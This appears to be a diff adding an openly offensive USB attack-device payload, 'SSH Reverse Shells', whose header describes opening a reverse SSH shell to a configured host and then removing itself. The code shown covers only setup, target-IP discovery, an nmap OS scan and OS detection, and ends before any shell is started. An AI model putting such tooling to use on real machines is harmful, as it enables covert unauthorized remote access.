@@ -1,0 +1,78 @@
+# Title:         SSH Reverse Shells
+# Author:        Ludicro
+# Version:       1.0
+#
+# Based off of tuzzmaniandevil's LinuxReverseShell and OS detection based off gled's win93
+# Runs a script in the background that creates a reverse ssh shell connection to the configured address and then removes itself
+# Will attempt to determine the OS type and run the appropriate script
+#
+# Target: Windows, MacOs, Linux
+# Attackmodes: Ethernet, HID
+# Category: Remote Access
+#
+# Stages
+# STAGE1: Determine the OS of the system (Linux default)
+
+
+# Default options
+LOOTDIR='/root/udisk/loot/ssh_rshell'
+
+# Shell Config
+RHOST=127.0.0.1
+RPORT=4444
+
+# Start Setup
+LED SETUP
+mkdir -p $LOOTDIR
+echo "Starting ssh_rshell: " > $LOOTDIR/ssh_rshell.log
+IS_WIN=0
+
+
+# Checking for OS
+LED STAGE1
+
+# Test for UNIX Target
+ATTACKMODE ECM_ETHERNET
+GET TARGET_IP
+if [ -z "${TARGET_IP}" ]; then
+  echo "No target IP, checking if it's a windows host: " >> $LOOTDIR/ssh_rshell.log
+  ATTACKMODE RNDIS_ETHERNET
+  GET TARGET_IP
+  if [ -z "${TARGET_IP}" ]; then
+      LED FAIL
+      exit 1
+  fi
+  IS_WIN=1
+  echo "Found Windows target IP: $TARGET_IP" >> $LOOTDIR/ssh_rshell.log
+  OS='WIN'
+else
+    # I haven't tested this cause I don't have a mac to test
+    echo "Found UNIX target IP: $TARGET_IP" >> $LOOTDIR/ssh_rshell.log
+    echo "UNIX OS Detection - launching nmap scan" >> $LOOTDIR/ssh_rshell.log
+    nmap -O -sV --osscan-guess $TARGET_IP > $LOOTDIR/nmap_results.log
+
+
+    ATTACKMODE HID
+    echo "UNIX OS Detection, analyzing nmap results" >> $LOOTDIR/ssh_rshell.log
+    grep -i 'linux' $LOOTDIR/nmap_results.log
+    RES=$?
+    echo "After Linux grep: $RES" >> $LOOTDIR/ssh_rshell.log
+    if [ $RES -eq 0 ]
+    then
+        OS='LINUX'
+    else
+        grep -v 'MAC Address' $LOOTDIR/nmap_results.log | grep -i 'mac'
+        RES=$?
+        echo "After mac grep: $RES" >> $LOOTDIR/ssh_rshell.log
+        if [ $RES -eq 0 ]
+        then
+            OS='MAC'
+        fi
+    fi
+fi
+
+echo "$OS Host detected" >> $LOOTDIR/ssh_rshell.log
+
+
+
+LED FINISH
